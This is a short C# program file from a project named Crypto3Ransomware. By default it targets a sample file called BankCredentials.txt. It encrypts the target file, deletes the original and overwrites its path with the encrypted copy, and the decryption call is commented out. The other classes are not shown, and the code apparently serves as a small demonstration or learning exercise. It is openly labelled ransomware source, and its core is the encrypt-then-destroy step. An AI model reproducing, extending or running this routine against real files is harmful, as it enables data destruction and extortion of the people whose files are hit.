namespace Crypto3Ransomware;

internal static class Program
{
    private static async Task Main(string[] args)
    {
        Console.WriteLine(Directory.GetCurrentDirectory());
        if(args.Length == 0)
        args =
        [
            $"..{Path.DirectorySeparatorChar}..{Path.DirectorySeparatorChar}..{Path.DirectorySeparatorChar}RandomFiles{Path.DirectorySeparatorChar}BankCredentials.txt"
        ];
        var inputManager = new InputManager(args);
        var fileToEncryptPath = inputManager.GetFileToEncryptPath();
        var encryptedFilePath = fileToEncryptPath + "2";
        // var encryptedFilePath = fileToEncryptPath;
        // var decryptedFilePath = fileToEncryptPath + "3";
        
        Console.WriteLine($"File found : {fileToEncryptPath}");

        FileEncrypter.EncryptAndWriteToPath(fileToEncryptPath, encryptedFilePath);
        // await FileDecrypter.DecryptAndWriteToPath(encryptedFilePath, decryptedFilePath);
        
        File.Delete(fileToEncryptPath);
        File.Move(encryptedFilePath,fileToEncryptPath);
        Console.WriteLine("File encrypted");
    }
}